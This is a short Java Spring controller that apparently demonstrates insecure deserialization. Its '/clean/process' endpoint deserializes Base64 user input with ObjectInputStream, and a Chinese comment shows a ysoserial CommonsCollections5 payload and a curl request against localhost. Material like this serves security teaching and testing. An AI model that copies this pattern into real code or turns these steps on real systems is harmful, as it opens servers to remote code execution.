package com.example.demo;

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.Base64;

@RestController
@RequestMapping("/clean")
public class DataCleaner {
    @PostMapping("/process")
    public String processData(@RequestParam String data) {
        try {
            byte[] decoded = Base64.getDecoder().decode(data);
            ByteArrayInputStream bais = new ByteArrayInputStream(decoded);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object obj = ois.readObject();
            ois.close();
            return "Processed: " + obj.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}

// 模拟数据模型
class CleanData implements Serializable {
    private String content;
    public String toString() { return "Data: " + content; }
}

/*
攻击示例：
1. 使用ysoserial生成payload：
   java -jar ysoserial.jar CommonsCollections5 "calc" | base64
2. 发送请求：
   curl "http://localhost:8080/clean/process?data=<base64_payload>"
*/